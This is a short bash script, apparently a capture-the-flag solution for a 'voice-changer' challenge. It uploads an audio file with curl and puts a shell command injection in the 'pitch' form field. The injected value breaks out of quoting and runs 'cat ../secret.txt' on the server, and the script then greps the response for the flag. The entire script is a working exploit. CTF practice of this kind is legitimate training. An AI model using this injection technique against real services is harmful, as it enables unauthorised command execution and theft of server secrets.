#!/bin/bash
curl --location 'https://uoftctf-voice-changer.chals.io/upload' \
--form 'pitch="\" >/dev/null | cat ../secret.txt #"' \
--form 'input-file=@"audio.ogg"' -s | grep -o 'uoftctf{[^}]*}'
